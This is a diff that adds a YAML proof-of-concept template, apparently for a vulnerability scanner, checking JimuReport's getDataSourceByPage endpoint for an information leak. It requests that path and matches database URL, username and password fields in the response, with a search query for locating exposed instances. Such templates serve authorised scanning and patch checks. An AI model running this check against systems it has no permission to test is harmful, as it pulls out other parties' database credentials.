@@ -1,0 +1,24 @@
+id: poc-yaml-jimureport-getdatasourcebypage-info-leak
+info:
+  name: 积木报表 getDataSourceByPage 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 积木报表
+  hunter: web.body="积木报表"
+requests:
+- method: GET
+  path: /jmreport/getDataSourceByPage
+  expression: 'status_code == 200 &&
+
+    matches(body,"\"dbUrl\":\"(.*?)\"") &&
+
+    matches(body,"\"dbUsername\":\"(.*?)\"") &&
+
+    matches(body,"\"dbPassword\":\"(.*?)\"") &&
+
+    contains(content_type,"application/json")
+
+    '
+variables: {}
+transport: http
